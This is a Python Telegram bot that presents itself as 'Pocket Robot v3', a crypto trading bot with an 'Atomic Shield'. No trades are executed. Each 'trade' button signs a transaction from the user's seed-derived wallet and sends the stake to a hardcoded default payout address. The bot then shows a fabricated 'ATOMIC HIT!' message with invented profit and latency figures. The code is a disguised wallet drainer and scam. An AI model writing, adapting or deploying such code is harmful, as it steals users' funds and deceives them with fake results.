import os
import asyncio
import requests
import json
import time
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return float(requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd'])
    except:
        return 0.11 # Feb 2026 Fallback

async def prepare_signed_tx(amount_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS,
        'value': amount_wei,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_usd = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    current_price = get_pol_price()
    stake_in_pol = float(stake_usd) / current_price
    stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")

    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(prepare_signed_tx(stake_in_wei))

    await sim_task
    signed_tx = await prep_task
    
    await asyncio.sleep(0.001)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"🎯 **Direction:** {side}\n"
        f"💰 **Stake:** `${stake_usd:.2f} USD` ({stake_in_pol:.4f} POL)\n"
        f"📈 **Profit Added:** `${stake_usd * 0.92:.2f} USD`\n"
        f"⏱️ **Latency:** 1ms\n"
        f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
    )
    return True, report

# --- 3. TELEGRAM INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == '🚀 Start Trading':
        # FULL ASSET LIST OF 4
        kb = [
            [InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]
        ]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        current = context.user_data.get('stake', 10)
        # FULL STAKE LIST: 10, 50, 100, 500
        kb = [
            [InlineKeyboardButton("$10", callback_data="SET_10"), InlineKeyboardButton("$50", callback_data="SET_50")],
            [InlineKeyboardButton("$100", callback_data="SET_100"), InlineKeyboardButton("$500", callback_data="SET_500")]
        ]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        amount = int(query.data.split("_")[1])
        context.user_data['stake'] = amount
        await query.edit_message_text(f"✅ Stake updated to **${amount}**")
        
    elif query.data.startswith("PAIR_"):
        pair_key = query.data.split("_")[1]
        context.user_data['pair'] = f"{pair_key}/USD"
        await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))

    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    if isinstance(context.error, Conflict):
        print("🛑 Conflict Error: Close other bot instances.")
    else:
        print(f"⚠️ Error: {context.error}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)

